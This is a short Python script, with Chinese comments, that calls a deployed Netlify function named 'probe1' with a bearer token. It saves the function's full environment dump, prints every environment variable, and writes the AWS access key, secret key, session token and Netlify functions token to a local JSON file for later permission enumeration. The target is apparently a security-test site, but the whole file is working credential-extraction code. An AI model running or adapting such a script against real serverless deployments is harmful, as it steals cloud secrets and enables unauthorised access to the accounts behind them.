# -*- coding: utf-8 -*-
"""Netlify:调用 probe1(完整凭证不截断)保存响应,提取凭证 → 本地枚举权限"""
import http.client, ssl, gzip, brotli, sys, json
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A

ctx = ssl.create_default_context()

def api(host, path, token):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + token}
    conn.request('GET', path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

st, raw = api('sec-test-rcf6lz.netlify.app', '/.netlify/functions/probe1', TOKEN_A)
print('probe1 invoke:', st, 'len', len(raw))
text = raw.decode('utf-8', 'replace')
open(r'D:\scan\netlify_report\_probe1_full.txt', 'w', encoding='utf-8').write(text)
d = json.loads(text)
env = d.get('env', {})
print('env keys:', len(env))
for k in env:
    v = env[k]
    print(' %s len=%d head=%s' % (k, len(v), v[:40]))
aws = {
    'access_key': env.get('AWS_ACCESS_KEY_ID', ''),
    'secret_key': env.get('AWS_SECRET_ACCESS_KEY', ''),
    'session_token': env.get('AWS_SESSION_TOKEN', ''),
    'region': 'us-east-2',
    'nf_token': env.get('NETLIFY_FUNCTIONS_TOKEN', ''),
}
json.dump(aws, open(r'D:\scan\netlify_report\_aws_creds1.json', 'w'), indent=1)
print('saved _aws_creds1.json (region assumed us-east-2; probe1 无 AWS_REGION env 时需从 metadata 判断)')
